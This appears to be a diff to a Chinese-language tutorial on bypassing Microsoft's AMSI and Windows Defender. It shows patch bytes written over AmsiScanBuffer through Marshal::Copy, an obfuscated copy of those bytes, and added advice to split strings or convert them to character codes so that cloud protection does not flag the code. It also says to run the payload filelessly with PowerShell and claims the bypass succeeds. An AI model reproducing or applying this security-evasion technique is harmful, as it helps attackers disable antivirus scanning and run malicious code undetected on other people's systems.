@@ -89,7 +89,7 @@ $Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
 [System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6)
 ```
 
-### 当然如果你怕代码被云防护标记的话，可以添加一些混淆，比如说字符串的分裂，或者转换成ASCLL字符码
+### 当然如果你怕代码被云防护标记的话，可以添加一些混淆，比如说字符串的分裂和拼接，或者转换成ASCLL字符码
 
 ```
 #导入API 函数
@@ -123,13 +123,15 @@ $hquzq = [Byte[]] ($jniv,$kgmv,$odgn,$zalk,+$cfun,+$macm)
 ### 将混淆过后的代码插入解密代码中（pay.ps1）
 
 ![image](https://user-images.githubusercontent.com/89376703/155734244-a2185115-0d62-4b8c-96f0-7e09b6caf530.png)
-### 放在windows defender环境下无文件执行即可
+### 放在windows defender环境下用PowerShell无文件执行即可
 
 ![image](https://user-images.githubusercontent.com/89376703/155734381-81a55fb3-78f8-4303-b78a-0e88702ff2fb.png)
 
 ### 可以看到可以绕过微软，能执行一些基本的命令，但是dumplass应该不行。
 
 ## **绕过原理**
+
+### 绕过的关键是这段
 
 ### 2018 年 5 月，CyberArk 发布了 POC 代码，通过修补其功能之一，即 AmsiScanBuffer() 来绕过 AMSI
 
